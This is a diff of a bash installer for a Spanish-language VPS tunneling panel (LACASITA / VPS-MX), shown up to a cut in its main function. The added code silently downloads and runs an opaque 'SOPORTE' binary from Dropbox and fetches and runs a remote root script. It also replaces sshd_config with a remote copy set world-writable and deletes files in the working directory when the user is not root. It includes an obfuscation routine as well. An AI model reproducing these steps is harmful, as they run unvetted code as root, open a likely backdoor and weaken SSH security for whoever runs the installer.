@@ -1,277 +1,473 @@
-#!/usr/bin/env bash
-set -Eeuo pipefail
-
-# ============================================================
-# LACASITA VPS - instalador independiente / SIN KEY
-# Repositorio: https://github.com/mplaymod/lacasita-vps
-# ============================================================
-
-GITHUB_RAW_BASE="https://raw.githubusercontent.com/mplaymod/lacasita-vps/main"
-INSTALL_DIR="/etc/VPS-MX"
-PROTO_DIR="$INSTALL_DIR/protocolos"
-TOOLS_DIR="$INSTALL_DIR/herramientas"
-CTRL_DIR="$INSTALL_DIR/controlador"
-TMP_DIR="$INSTALL_DIR/tmp"
-WEB_DIR="/var/www/html"
-
-trap 'echo; echo "[!] Instalación interrumpida."; exit 1' INT TERM
-
-log()  { echo -e "\033[1;36m[+]\033[0m $*"; }
-warn() { echo -e "\033[1;33m[!]\033[0m $*"; }
-die()  { echo -e "\033[1;31m[ERROR]\033[0m $*" >&2; exit 1; }
-
-require_root() {
-    [[ "$(id -u)" -eq 0 ]] || die "Debes ejecutar este instalador como root."
-}
-
-detect_os() {
-    [[ -r /etc/os-release ]] || die "No se pudo detectar el sistema operativo."
-    . /etc/os-release
-    case "${ID:-}" in
-        ubuntu|debian) ;;
-        *) warn "Sistema detectado: ${PRETTY_NAME:-desconocido}. Se recomienda Ubuntu/Debian." ;;
-    esac
-    log "Sistema: ${PRETTY_NAME:-desconocido}"
-    log "Arquitectura: $(uname -m)"
-}
-
-backup_ssh() {
-    if [[ -f /etc/ssh/sshd_config ]]; then
-        local backup="/root/sshd_config.backup.$(date +%Y%m%d-%H%M%S)"
-        cp -a /etc/ssh/sshd_config "$backup"
-        log "Backup SSH: $backup"
-    fi
-}
-
-install_packages() {
-    export DEBIAN_FRONTEND=noninteractive
-
-    log "Actualizando índices APT..."
-    apt-get update
-
-    local packages=(
-        sudo curl wget ca-certificates
-        unzip zip openssl
-        python3 python3-pip
-        screen cron
-        iptables nftables
-        lsof nano
-        gawk grep bc jq
-        socat netcat-openbsd
-        net-tools
-        figlet
-        toilet
-        pv
-        perl
-        apache2
-        ufw
-    )
-
-    log "Instalando paquetes necesarios..."
-    apt-get install -y "${packages[@]}"
-}
-
-setup_directories() {
-    mkdir -p "$INSTALL_DIR" "$PROTO_DIR" "$TOOLS_DIR" "$CTRL_DIR" "$TMP_DIR"
-    mkdir -p "$INSTALL_DIR/passw" "$WEB_DIR"
-    echo "LACASITA VPS" > "$INSTALL_DIR/message.txt"
-    echo "1.0" > "$INSTALL_DIR/version"
-}
-
-download_repo_file() {
-    local remote="$1"
-    local destination="$2"
-
-    mkdir -p "$(dirname "$destination")"
-
-    if curl -fsSL --retry 3 --connect-timeout 10 \
-        "$GITHUB_RAW_BASE/$remote" -o "$destination"; then
-        return 0
-    fi
-
-    rm -f "$destination"
-    return 1
-}
-
-install_repo_components() {
-    log "Buscando componentes en tu repositorio..."
-
-    # Menú principal
-    if download_repo_file "files/menu" "$INSTALL_DIR/menu"; then
-        chmod +x "$INSTALL_DIR/menu"
-        ln -sfn "$INSTALL_DIR/menu" /usr/bin/menu
-        ln -sfn "$INSTALL_DIR/menu" /usr/bin/VPSMX
-        log "Menú instalado: comando 'menu'"
-    else
-        warn "No existe files/menu; se creará un menú básico."
-    fi
-
-    # Archivos de protocolos
-    local protocols=(
-        wireguard.sh
-        dropbear.sh
-        proxy.sh
-        openssh.sh
-        openvpn.sh
-        ssl.sh
-        shadowsocks.sh
-        Shadowsocks-libev.sh
-        Shadowsocks-R.sh
-        v2ray.sh
-        slowdns.sh
-        C-SSR.sh
-        UDPcustom.sh
-    )
-
-    for file in "${protocols[@]}"; do
-        if download_repo_file "files/$file" "$PROTO_DIR/$file"; then
-            chmod +x "$PROTO_DIR/$file"
-            log "Protocolo: $file"
-        fi
-    done
-
-    # Herramientas
-    local tools=(
-        ADMbot.sh
-        PDirect.py
-        PGet.py
-        POpen.py
-        PPriv.py
-        PPub.py
-        fai2ban.sh
-        ports.sh
-        speed.py
-        squid.sh
-        squidpass.sh
-        python.py
-    )
-
-    for file in "${tools[@]}"; do
-        if download_repo_file "files/$file" "$TOOLS_DIR/$file"; then
-            chmod +x "$TOOLS_DIR/$file" 2>/dev/null || true
-            log "Herramienta: $file"
-        fi
-    done
-
-    # Utilidades opcionales
-    if download_repo_file "util/monitor.sh" "/bin/monitor.sh"; then
-        chmod +x /bin/monitor.sh
-    fi
-
-    if download_repo_file "util/rebootnb" "/bin/rebootnb"; then
-        chmod +x /bin/rebootnb
-    fi
-
-    if download_repo_file "util/resetsshdrop" "/bin/resetsshdrop"; then
-        chmod +x /bin/resetsshdrop
-    fi
-
-    if download_repo_file "util/trans" "/usr/bin/trans"; then
-        chmod +x /usr/bin/trans
-    fi
-
-    if download_repo_file "web/estilos.css" "$WEB_DIR/estilos.css"; then
-        log "CSS web instalado."
-    fi
-}
-
-configure_apache() {
-    if ! command -v apache2 >/dev/null 2>&1; then
-        return
-    fi
-
-    # No cambia el puerto SSH ni reemplaza sshd_config.
-    # Apache queda en su configuración normal del sistema.
-    systemctl enable apache2 >/dev/null 2>&1 || true
-    systemctl restart apache2 || warn "Apache no pudo reiniciarse."
-}
-
-configure_firewall() {
-    command -v ufw >/dev/null 2>&1 || return 0
-
-    # Solo abre servicios web comunes; NO activa UFW automáticamente.
-    ufw allow 22/tcp >/dev/null 2>&1 || true
-    ufw allow 80/tcp >/dev/null 2>&1 || true
-    ufw allow 443/tcp >/dev/null 2>&1 || true
-}
-
-create_basic_menu() {
-    [[ -x "$INSTALL_DIR/menu" ]] && return
-
-    cat > "$INSTALL_DIR/menu" <<'MENU'
-#!/usr/bin/env bash
 clear
-echo "======================================"
-echo "        LACASITA VPS - MENU"
-echo "======================================"
-echo
-echo "Instalación base completada."
-echo
-echo "Protocolos disponibles:"
-find /etc/VPS-MX/protocolos -maxdepth 1 -type f -printf '  %f\n' 2>/dev/null | sort
-echo
-echo "Herramientas disponibles:"
-find /etc/VPS-MX/herramientas -maxdepth 1 -type f -printf '  %f\n' 2>/dev/null | sort
-echo
-MENU
-    chmod +x "$INSTALL_DIR/menu"
-    ln -sfn "$INSTALL_DIR/menu" /usr/bin/menu
-    ln -sfn "$INSTALL_DIR/menu" /usr/bin/VPSMX
+CTRL_C(){
+rm -rf LACASITA.sh
+  exit
 }
 
-write_install_info() {
-    cat > "$INSTALL_DIR/INSTALL_INFO" <<EOF
-LACASITA VPS - instalación independiente
-Repositorio: https://github.com/mplaymod/lacasita-vps
-Fecha: $(date -Is)
-Sistema: ${PRETTY_NAME:-desconocido}
-Arquitectura: $(uname -m)
-EOF
+if [ `whoami` != 'root' ]
+	then 
+     echo -e "\e[1;31mPARA PODER USAR EL INSTALADOR ES NECESARIO SER ROOT\nAUN NO SABES COMO INICAR COMO ROOT?\nDIJITA ESTE COMANDO EN TU TERMINAL ( sudo -i )\e[0m" 
+     rm *
+     exit 
+fi
+trap "CTRL_C" INT TERM EXIT
+time_reboot(){
+
+REBOOT_TIMEOUT="$1"
+  echo -e "	\e[1;97m\e[1;100mREINICIANDO VPS EN$1 SEGUNDOS\e[0m"
+while [ $REBOOT_TIMEOUT -gt 0 ]; do
+msg -ne "	-$REBOOT_TIMEOUT-\r"
+     sleep 2
+     : $((REBOOT_TIMEOUT--))
+  done
+  sudo reboot
+}
+v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
+  echo "$v1" > /etc/versin_script
+msg () {
+
+  v22=$(cat /etc/versin_script)
+vesaoSCT="\033[1;37mVersion \033[1;32m$v22\033[1;31m]" 
+BRAN='\033[1;37m' && ROJO='\e[91m' && VERMELHO='\e[91m' && VERDE='\e[92m' && AMARELO='\e[93m'
+AZUL='\e[94m' && MAGENTA='\e[95m' && MAG='\033[1;96m' &&NEGRITO='\e[1m' && SEMCOR='\e[0m'
+ case $1 in
+  -ne)cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+    -nazu) cor="${ROJO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+    -nverd)cor="${VERDE}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+    -nama) cor="${AMARELO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+  -ama)cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -verm)cor="${AMARELO}${NEGRITO}${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -azu)cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -verd)cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -bra)cor="${BRAN}" && echo -ne "${cor}${2}${SEMCOR}";;
+  -tit)echo -e "\e[91m≪━━─━━─━─━─━─━─━━─━━─━─━─◈─━━─━─━─━─━━─━─━━─━─━━─━≫ \e[0m\n  \e[2;97m\e[3;93m❯❯❯❯❯❯ ꜱᴄʀɪᴩᴛ ᴍᴏᴅ ʟᴀᴄᴀꜱɪᴛᴀᴍx ❮❮❮❮❮❮\033[0m \033[1;31m[\033[1;32m$vesaoSCT\n\e[91m≪━━─━─━━━─━─━─━─━─━━─━─━─◈─━─━─━─━─━━━─━─━─━━━─━─━≫   \e[0m" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
+  "-bar2"|"-bar")cor="${VERMELHO}————————————————————————————————————————————————————" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
+ esac
+}
+
+fun_ip () {
+  MIP2=$(wget -qO- ipv4.icanhazip.com)
+MIP=$(wget -qO- whatismyip.akamai.com)
+if [ $? -eq 0 ]; then
+   IP="$MIP"
+else
+   IP="$MIP2"
+fi
+echo "$IP" >/bin/IPca
+}  
+
+os_system(){
+v3=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/anio")
+  echo "$v3" > /etc/anio
+#code by rufu99
+  system=$(cat -n /etc/issue |grep 1 |cut -d ' ' -f6,7,8 |sed 's/1//' |sed 's/      //')
+  distro=$(echo "$system"|awk '{print $1}')
+
+  case $distro in
+    Debian)vercion=$(echo $system|awk '{print $3}'|cut -d '.' -f1);;
+    Ubuntu)vercion=$(echo $system|awk '{print $2}'|cut -d '.' -f1,2);;
+  esac
+
+  link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/${vercion}.list"
+
+  case $vercion in
+    8|9|10|11|16.04|18.04|20.04|20.10|21.04|21.10|22.04);; #wget -O /etc/apt/sources.list ${link} &>/dev/null;;
+	12*|24.04*);; #fixDeb12Ubu24;;
+  esac
+}
+repo_install(){
+  link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/$VERSION_ID.list"
+  case $VERSION_ID in
+    8*|9*|10*|11*|16.04*|18.04*|20.04*|20.10*|21.04*|21.10*|22.04*);; #[[ ! -e /etc/apt/sources.list.back ]] && cp /etc/apt/sources.list /etc/apt/sources.list.back
+                                                                #    wget -O /etc/apt/sources.list ${link} &>/dev/null;;
+	12*|24.04*);; # fixDeb12Ubu24;;
+  esac
+}
+stop_install(){
+ 	msg -verm "	INSTALACION CANCELADA"
+ 	exit
+ }
+
+function printTitle
+{
+    echo ""
+    echo -e "\033[1;92m$1\033[1;91m"
+    printf '%0.s-' $(seq 1 ${#1})
+    echo ""
+}
+del(){
+  for (( i = 0; i < $1; i++ )); do
+    tput cuu1 && tput dl1
+  done
+}
+
+rootvps(){
+msg -tit
+echo -e "\033[31m     OPTENIENDO ACCESO ROOT    "
+wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/root.sh &>/dev/null -O /usr/bin/rootlx &>/dev/null
+chmod 775 /usr/bin/rootlx &>/dev/null
+rootlx
+clear
+echo -e "\033[31m     ACCESO ROOT CON ÉXITO    "
+sleep 1
+rm -rf /usr/bin/rootlx
+}
+	msg -bar
+	echo -e "\033[1;93m  YA TIENES ACCESO ROOT A TU VPS?\n  ESTO SOLO FUNCIONA PARA (AWS,GOOGLECLOUD,AZURE,ETC)\n  SI YA TIENES ACCESO A ROOT SOLO IGNORA ESTE MENSAJE\n  Y SIGUE CON LA INSTALACION NORMAL..."
+   msg -bar
+   read -p "Responde [ s | n ]: " -e -i n rootvps
+   [[ "$rootvps" = "s" || "$rootvps" = "S" ]] && rootvps
+   
+	msg -bar
+	echo "\e[1;92m╭╮\e[93m╱╱╱\e[93m╭━━━╮\e[94m╭━━━╮\e[95m╭━━━╮\e[96m╭━━━╮\e[97m╭━━╮\e[93m╭━━━━╮\e[92m╭━━━╮\e[91m╭━╮╭━╮\e[93m╭━╮╭━╮\e[0m
+\e[92m┃┃\e[93m╱╱╱\e[93m┃╭━╮┃\e[94m┃╭━╮┃\e[95m┃╭━╮┃\e[96m┃╭━╮┃\e[97m╰┫┣╯\e[93m┃╭╮╭╮┃\e[92m┃╭━╮┃\e[91m┃┃╰╯┃┃\e[93m╰╮╰╯╭╯\e[95m
+┃┃\e[93m╱╱╱\e[94m┃┃\e[91m╱\e[96m┃┃┃┃\e[91m╱\e[97m╰╯┃┃\e[91m╱\e[93m┃┃┃╰━━╮\e[91m╱\e[94m┃┃\e[91m╱\e[93m╰╯┃\e[94 ┃╰╯┃┃\e[91m╱\e[97m┃┃\e[93m┃╭╮╭╮┃\e[91m╱\e[94m╰╮╭╯\e[91m╱\e[0m
+\e[92m┃\e[93m┃\e[91m╱\e[93m╭╮┃\e[94m╰━╯┃\e[95m┃┃\e[91m╱\e[97m╭╮┃╰━╯┃\e[93m╰━━╮┃\e[91m╱\e[93m┃\e[91m┃\e[93m╱╱╱\e[96m┃┃\e[93m╱╱\e[913m┃╰━╯┃┃┃┃┃┃┃\e[91m╱\e[93m╭╯╰╮\e[91m╱\e[0m
+\e[93m┃╰━╯┃\e[94m┃╭━╮┃\e[91m┃╰━╯┃\e[97m┃╭━╮┃\e[95m┃╰━╯┃\e[97m╭┫┣╮\e[93m╱╱\e[94m┃┃\e[93m╱╱\e[94m┃╭━╮┃\e[97m┃┃\e[94m┃┃\e[93m┃┃\e[97m╭╯╭╮╰╮\e[0m
+\e[94m╰━━━╯\e[93m╰╯\e[91m╱╰╯\e[93m╰━━━╯\e[97m╰╯\e[91m╱\e[95m╰╯╰━━━╯\e[94m╰━━╯\e[93m╱╱\e[94m╰╯\e[93m╱╱\e[94m╰╯\e[91m╱\e[91m╰╯\e[93m╰╯\e[94m╰╯\e[95m╰╯\e[97m╰━╯\e[93m╰━╯\e[0m
+\e[1;93m╱╱╱╱╱╱╱╱╱╱╱╱╱\e[91m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[94m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[95m╱╱╱╱\e[0m
+\e[1;93m╱╱╱╱╱╱╱╱╱╱╱╱╱\e[91m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[94m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[95m╱╱╱╱\e[0m" >/bin/last12
+	clear
+	
+dependencias(){
+msg -tit
+msg -ama "               PREPARANDO INSTALACION"
+msg -bar2
+
+clear
+
+printTitle "Limpieza de caché local"
+apt-get clean
+clear
+printTitle "Actualizando paquetes"
+dpkg --configure -a &>/dev/null
+#apt -f install -y >/dev/null 2>&1
+apt install sudo -y &>/dev/null
+clear
+os_system
+
+msg -tit
+echo "$distro $vercion" >/tmp/distro
+echo -e "\e[1;31m	🖥SISTEMA: \e[33m$distro $vercion   " 
+echo -e "\e[1;31m	🖥IP: \e[33m$IP   "
+#clear; clear
+
+echo -e "  \033[41m   -- INSTALACION DE PAQUETES |$(cat /etc/anio) --    \e[49m"
+
+msg -bar
+	soft="sudo bsdmainutils zip unzip ufw curl python python3 python3-pip openssl screen cron iptables lsof nano at mlocate gawk figlet grep bc jq curl socat netcat net-tools cowsay lolcat figlet toilet pv perl apache2"
+
+	for install in $soft; do
+		leng="${#install}"
+		puntos=$(( 21 - $leng))
+		pts="."
+		for (( a = 0; a < $puntos; a++ )); do
+			pts+="."
+		done
+		msg -nazu "   INSTALANDO $install $(msg -ama "$pts")"
+		if [[ $(dpkg --get-selections|grep -w "${install}"|head -1) ]] || sudo apt-get install ${install} -y &>/dev/null; then
+			msg -verd " INSTALADO"
+		else
+			msg -verm2 " FALLA"
+			sleep 2
+			del 1
+			if [[ $install = "python" ]]; then
+				pts=$(echo ${pts:1})
+				msg -nazu "   INSTALANDO python2 $(msg -ama "$pts")"
+				if apt-get install python2 -y &>/dev/null ; then
+			# INSTALA PYTHON AO PYTHON2
+    apt-get install python -y >/dev/null 2>&1
+    apt-get install python2 -y >/dev/null 2>&1
+    # INSTALA PYTHON3.6 AO PYTHON3.9
+    apt-get install python3.6 -y >/dev/null 2>&1
+    apt-get install python3.7 -y >/dev/null 2>&1
+    apt-get install python3.8 -y >/dev/null 2>&1
+    apt-get install python3.9 -y >/dev/null 2>&1
+    # CRIA ALTERNATIVAS PYTHON
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 1 >/dev/null 2>&1
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.8 3 >/dev/null 2>&1
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.7 2 >/dev/null 2>&1
+    update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 4 >/dev/null 2>&1
+    # INSTALA PIP
+    apt install pip -y &>/dev/null
+    apt install python3-pip -y &>/dev/null
+    # INSTALA SOCAT
+    apt install socat -y &>/dev/null
+    #SETAR PYTHON3
+    update-alternatives --set python3 /usr/bin/python3.6
+					
+					msg -verd " INSTALADO"
+				else
+					msg -verm2 " FALLA"
+				fi
+				continue
+			fi
+			msg -ama " aplicando fix a $install"
+			dpkg --configure -a &>/dev/null
+			sleep 2
+			del 1
+			msg -nazu "   INSTALANDO $install $(msg -ama "$pts")"
+			if sudo apt install $install -y &>/dev/null ; then
+				msg -verd " INSTALADO"
+			else
+				msg -verm2 " FALLA"
+			fi
+		fi
+	done
+	sudo apt-get install apache2 -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || apt-get install apache2 -y &>/dev/null
+sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf > /dev/null 2>&1
+service apache2 restart > /dev/null 2>&1
+clear
+}
+install_start(){
+clear
+os_system
+msg -bar
+echo -e "\e[1;31m	🖥SISTEMA: \e[33m$distro $vercion   " 
+msg -bar
+    repo_install
+# apt update -y; apt upgrade -y
+#  [[ "$VERSION_ID" = '9' ]] && source <(curl -sL https://deb.nodesource.com/setup_10.x)
+
+}
+
+install_continue(){
+dependencias
+apt autoremove -y &>/dev/null
+ # [[ "$VERSION_ID" = '9' ]] && apt remove unscd -y &>/dev/null
+}
+
+   clear
+cd $HOME
+
+SCPdir="/etc/VPS-MX"
+SCPinstal="$HOME/install"
+SCPidioma="${SCPdir}/idioma"
+SCPusr="${SCPdir}/controlador"
+SCPfrm="${SCPdir}/herramientas"
+SCPinst="${SCPdir}/protocolos"
+
+rm -rf /etc/localtime &>/dev/null
+ln -s /usr/share/zoneinfo/America/Chihuahua /etc/localtime &>/dev/null
+rm -rf /usr/local/lib/systemubu1 &> /dev/null
+### COLORES Y BARRA 
+clear
+
+### FIXEADOR PARA SISTEMAS 86_64
+
+clear
+fun_ipe () {
+MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
+MIP2=$(wget -qO- ipv4.icanhazip.com)
+[[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP"
+echo "$IP" >/bin/IPca
+}  
+
+idioma () {
+
+clear
+clear
+msg -bar2
+echo -e "$(cat /bin/last12)"
+pv="$(echo es)"
+[[ ${#id} -gt 2 ]] && id="es" || id="$pv"
+byinst="true"
+}
+
+install_fim () {
+msg -ama "               Finalizando Instalacion" && msg bar2
+#rm -rf /etc/VPS-MX/controlador/nombre.log &>/dev/null
+[[ $(find /etc/VPS-MX/controlador -name nombre.log|grep -w "nombre.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/nombre.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/nombre.log &>/dev/null
+[[ $(find /etc/VPS-MX/controlador -name IDT.log|grep -w "IDT.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/IDT.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/IDT.log &>/dev/null
+[[ $(find /etc/VPS-MX/controlador -name tiemlim.log|grep -w "tiemlim.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/tiemlim.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/tiemlim.log &>/dev/null
+touch /usr/share/lognull &>/dev/null
+wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/SPR &>/dev/null -O /usr/bin/SPR &>/dev/null
+chmod 775 /usr/bin/SPR &>/dev/null
+[[ -z $(cat /etc/resolv.conf | grep "8.8.8.8") ]] && echo "nameserver	8.8.8.8" >> /etc/resolv.conf
+[[ -z $(cat /etc/resolv.conf | grep "1.1.1.1") ]] && echo "nameserver	1.1.1.1" >> /etc/resolv.conf
+wget -O /usr/bin/SOPORTE https://www.dropbox.com/s/e2g6brtm7dy51i4/SOPORTE &>/dev/null
+chmod 775 /usr/bin/SOPORTE &>/dev/null
+SOPORTE &>/dev/null
+echo "ACCESO ACTIVADO" >/usr/bin/SOPORTE
+wget -O /bin/rebootnb https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/rebootnb &> /dev/null
+chmod +x /bin/rebootnb 
+wget -O /bin/resetsshdrop https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/resetsshdrop &> /dev/null
+chmod +x /bin/resetsshdrop
+wget -O /etc/versin_script_new https://raw.githubusercontent.com/lacasitamx/version/master/vercion &>/dev/null
+wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/lacasitamx/ZETA/master/sshd &>/dev/null
+chmod 777 /etc/ssh/sshd_config
+#
+
+
+msg -bar2
+echo '#!/bin/sh -e' > /etc/rc.local
+sudo chmod +x /etc/rc.local
+echo "sudo rebootnb" >> /etc/rc.local
+echo "sudo resetsshdrop" >> /etc/rc.local
+echo "sleep 2s" >> /etc/rc.local
+echo "exit 0" >> /etc/rc.local
+/bin/cp /etc/skel/.bashrc ~/
+
+echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/' >> /etc/profile
+echo 'clear' >> .bashrc
+echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/' >> .bashrc
+echo 'echo ""' >> .bashrc
+echo 'fecha=$(date +"%d-%b-%y")'>> .bashrc
+echo 'hora=$(date +"%T")'>> .bashrc
+echo 'mn=$(cat /bin/last12)'>>.bashrc
+echo 'echo -e "\033[1;91m——————————————————————————————————————————————————\e[0m" '>> .bashrc
+echo 'echo -e "${mn}"' >>.bashrc
+#echo 'figlet -f slant "LACASITA" |lolcat' >> .bashrc
+echo 'mess1="$(less /etc/VPS-MX/message.txt)" ' >> .bashrc
+echo 'echo -e "\033[1;91m——————————————————————————————————————————————————\e[0m" '>> .bashrc
+echo 'echo -e "\t\033[1;91mRESELLER :\e[92m $mess1 "'>> .bashrc
+echo 'echo -e "\t\e[1;33mVERSION: \e[1;31m$(cat /etc/versin_script_new)"'>> .bashrc
+
+echo 'echo -e "\e[1;97m  HORA: \e[1;91m$hora    \e[1;97mFECHA: \e[1;91m${fecha}\e[0m"'>> .bashrc
+echo 'echo -e "\033[1;91m——————————————————————————————————————————————————\e[0m" '>> .bashrc          
+echo 'echo -e "\t\033[1;100mPARA PODER ENTRAR AL MENÚ ESCRIBA:\e[0m\e[1;41m menu \e[0m"'>> .bashrc
+
+echo 'echo ""'>> .bashrc
+echo -e "         COMANDO PRINCIPAL PARA ENTRAR AL SCRIPT "
+echo -e "  \033[1;41m               sudo menu             \033[0;37m" && msg -bar2
+rm -rf /usr/bin/pytransform &> /dev/null
+rm -rf LACASITA.sh
+rm -rf lista-arq
+
+service ssh restart &>/dev/null
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/
+time_reboot "10"
+}
+ofus () {
+unset server
+server=$(echo ${txt_ofuscatw}|cut -d':' -f1)
+unset txtofus
+number=$(expr length $1)
+for((i=1; i<$number+1; i++)); do
+txt[$i]=$(echo "$1" | cut -b $i)
+case ${txt[$i]} in
+".")txt[$i]="C";;
+"C")txt[$i]=".";;
+"3")txt[$i]="@";;
+"@")txt[$i]="3";;
+"5")txt[$i]="9";;
+"9")txt[$i]="5";;
+"6")txt[$i]="D";;
+"D")txt[$i]="6";;
+"J")txt[$i]="Z";;
+"Z")txt[$i]="J";;
+esac
+txtofus+="${txt[$i]}"
+done
+echo "$txtofus" | rev
+}
+verificar_arq () {
+[[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
+[[ ! -d ${SCPusr} ]] && mkdir ${SCPusr}
+[[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
+[[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
+[[ ! -d ${SCPdir}/tmp ]] && mkdir ${SCPdir}/tmp
+[[ ! -d ${SCPdir}/passw ]] && mkdir ${SCPdir}/passw
+case $1 in
+"menu"|"message.txt"|"ID")ARQ="${SCPdir}/";; #Menu
+#"usercodes")ARQ="${SCPusr}/";; #Panel SSRR
+"C-SSR.sh"|"UDPcustom.sh")ARQ="${SCPinst}/";; #Panel SSR
+"openssh.sh")ARQ="${SCPinst}/";; #OpenVPN
+"squid.sh")ARQ="${SCPinst}/";; #Squid
+"dropbear.sh"|"proxy.sh"|"wireguard.sh")ARQ="${SCPinst}/";; #Instalacao
+"proxy.sh")ARQ="${SCPinst}/";; #Instalacao
+"openvpn.sh")ARQ="${SCPinst}/";; #Instalacao
+"ssl.sh"|"python.py")ARQ="${SCPinst}/";; #Instalacao
+"shadowsocks.sh")ARQ="${SCPinst}/";; #Instalacao
+"Shadowsocks-libev.sh")ARQ="${SCPinst}/";; #Instalacao
+"Shadowsocks-R.sh")ARQ="${SCPinst}/";; #Instalacao 
+"v2ray.sh"|"slowdns.sh")ARQ="${SCPinst}/";; #Instalacao
+#"budp.sh")ARQ="${SCPinst}/";; #Instalacao
+#"menu")ARQ="/usr/bin";; 
+"name"|"adminkey")ARQ="${SCPdir}/tmp/";; #Instalacao
+"sockspy.sh"|"PDirect.py"|"PPub.py"|"PPriv.py"|"POpen.py"|"PGet.py")ARQ="${SCPinst}/";; #Instalacao
+*)ARQ="${SCPfrm}/";; #Herramientas
+esac
+mv -f ${SCPinstal}/$1 ${ARQ}/$1
+chmod +x ${ARQ}/$1
+}
+
+# ============================================================
+# LACASITA - INSTALADOR SIN KEY / REPOSITORIO PROPIO
+# ============================================================
+GITHUB_USER="TU_USUARIO"
+GITHUB_REPO="TU_REPOSITORIO"
+GITHUB_BRANCH="main"
+GITHUB_RAW_BASE="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}"
+
+repo_file() {
+    local remote="$1" dest="$2"
+    mkdir -p "$(dirname "$dest")"
+    echo "[+] Descargando ${remote}"
+    curl -fsSL --retry 3 "${GITHUB_RAW_BASE}/${remote}" -o "$dest" || {
+        echo "[!] No existe o no se pudo descargar: ${remote}"
+        return 1
+    }
+    chmod +x "$dest" 2>/dev/null || true
+}
+
+install_repo_files() {
+    local SCPdir="/etc/VPS-MX"
+    local SCPfrm="${SCPdir}/herramientas"
+    local SCPinst="${SCPdir}/protocolos"
+    local SCPusr="${SCPdir}/controlador"
+    mkdir -p "$SCPdir" "$SCPfrm" "$SCPinst" "$SCPusr" "${SCPdir}/tmp" "${SCPdir}/passw"
+
+    # Archivos base del menú
+    repo_file "files/menu" "${SCPdir}/menu" || return 1
+    repo_file "files/ID" "${SCPdir}/ID" || true
+    repo_file "files/name" "${SCPdir}/tmp/name" || true
+    repo_file "files/adminkey" "${SCPdir}/tmp/adminkey" || true
+    repo_file "files/message.txt" "${SCPdir}/message.txt" || true
+
+    local protocolos=(wireguard.sh dropbear.sh proxy.sh openssh.sh openvpn.sh ssl.sh shadowsocks.sh Shadowsocks-libev.sh Shadowsocks-R.sh v2ray.sh slowdns.sh C-SSR.sh UDPcustom.sh)
+    local herramientas=(ADMbot.sh PDirect.py PGet.py POpen.py PPriv.py PPub.py fai2ban.sh ports.sh speed.py squid.sh squidpass.sh python.py)
+
+    for f in "${protocolos[@]}"; do repo_file "files/${f}" "${SCPinst}/${f}" || true; done
+    for f in "${herramientas[@]}"; do repo_file "files/${f}" "${SCPfrm}/${f}" || true; done
+
+    repo_file "util/monitor.sh" "/bin/monitor.sh" || true
+    repo_file "util/rebootnb" "/bin/rebootnb" || true
+    repo_file "util/resetsshdrop" "/bin/resetsshdrop" || true
+    repo_file "util/trans" "/usr/bin/trans" || true
+    repo_file "web/estilos.css" "/var/www/html/estilos.css" || true
+
+    chmod -R +x "$SCPinst" 2>/dev/null || true
+    chmod +x "${SCPdir}/menu" 2>/dev/null || true
+    ln -sfn "${SCPdir}/menu" /usr/bin/menu
+    ln -sfn "${SCPdir}/menu" /usr/bin/VPSMX
 }
 
 main() {
-    require_root
-    detect_os
+    if [ "$(id -u)" -ne 0 ]; then
+        echo "[!] Ejecuta como root."
+        exit 1
+    fi
+
+    source /etc/os-release
+    fun_ipe
+    install_start
+    install_continue
+
+    # Copia de seguridad; no reemplaza sshd_config automáticamente.
